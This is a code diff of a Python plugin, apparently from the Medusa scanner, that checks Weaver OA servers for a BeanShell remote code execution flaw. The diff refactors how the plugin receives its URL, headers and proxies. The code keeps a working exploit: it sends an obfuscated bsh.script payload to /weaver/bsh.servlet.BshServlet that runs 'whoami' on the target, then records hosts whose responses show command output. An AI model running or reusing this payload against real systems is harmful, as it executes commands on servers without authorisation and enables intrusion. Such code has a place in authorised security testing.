@@ -23,29 +23,14 @@ class VulnerabilityInfo(object):
         self.info['details'] = Medusa  # 结果
 
 
-def UrlProcessing(url):
-    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
-        res = urllib.parse.urlparse(url)
-    else:
-        res = urllib.parse.urlparse('http://%s' % url)
-    return res.scheme, res.hostname, res.port
-
-
 payload= '/weaver/bsh.servlet.BshServlet'
 post_data = 'bsh.script=eval%00("ex"%2b"ec(\"whoami\")");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw'
-def medusa(Url:str,Headers:dict,proxies:str=None,**kwargs)->None:
-    proxies=ClassCongregation.Proxies().result(proxies)
-
-    scheme, url, port = UrlProcessing(Url)
-    if port is None and scheme == 'https':
-        port = 443
-    elif port is None and scheme == 'http':
-        port = 80
-    else:
-        port = port
-
+def medusa(**kwargs)->None:
+    url = kwargs.get("Url")  # 获取传入的url参数
+    Headers = kwargs.get("Headers")  # 获取传入的头文件
+    proxies = kwargs.get("Proxies")  # 获取传入的代理参数
     try:
-        payload_url = scheme+"://"+url+ ':' + str(port)+payload
+        payload_url = url+payload
 
         Headers ['Accept']='*/*'
         Headers ["Referer"]= payload_url
@@ -59,7 +44,7 @@ def medusa(Url:str,Headers:dict,proxies:str=None,**kwargs)->None:
         if code==200 and (con.lower().find('system:')!=-1 or con.lower().find('root:')!=-1):
             Medusa = "{} 存在泛微OA远程代码执行漏洞\r\n漏洞详情:\r\nPayload:{}\r\nPost:{}\r\n".format(url, payload_url,post_data)
             _t = VulnerabilityInfo(Medusa)
-            ClassCongregation.VulnerabilityDetails(_t.info, url,**kwargs).Write()  # 传入url和扫描到的数据
+            ClassCongregation.VulnerabilityDetails(_t.info, resp,**kwargs).Write()  # 传入url和扫描到的数据
             ClassCongregation.WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
     except Exception as e:
         _ = VulnerabilityInfo('').info.get('algroup')
